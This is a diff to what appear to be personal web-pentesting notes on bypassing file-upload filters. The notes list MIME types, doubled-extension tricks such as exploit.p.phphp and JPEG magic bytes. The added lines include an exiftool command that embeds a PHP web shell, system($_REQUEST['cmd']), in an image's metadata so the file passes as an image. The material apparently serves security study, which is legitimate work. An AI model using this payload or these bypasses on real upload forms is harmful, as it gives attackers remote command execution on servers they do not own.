@@ -10,7 +10,8 @@ application/x-www-form-url-encoded    //for sending the simple text, HTML//
 multipart/form-data     //for sending large amount of data Image, pdf//
 image/jpeg  
 image/png     //images conetent types//
-application/x-httpd-php   
+application/x-httpd-php  
+application/octet-stream
 
 blacklistfiles bypass::
 .php
@@ -27,5 +28,8 @@ exploit.p.phphp
 File Conetents:
  JPEG files always begin with the bytes FF D8 FF in the burp response body
  ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.
+
+Metatag with exif tool
+exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' test.png   //in kali create a file with the php payload in image file//
 
  
